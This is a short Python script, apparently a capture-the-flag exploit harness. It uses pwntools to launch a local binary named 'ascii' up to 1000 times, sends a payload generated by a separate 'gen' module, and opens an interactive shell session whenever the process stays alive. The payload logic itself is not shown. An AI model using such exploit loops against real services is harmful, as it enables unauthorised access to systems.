#!/usr/bin/env python

from pwn import *
import gen
import time

for _ in range(1000):
    p = process('./ascii')
    p.sendline(gen.gen())
    time.sleep(0.1)
    res = p.recv()
    try:
        p.sendline("echo 'Success!'")
    except:
        continue
    p.interactive()
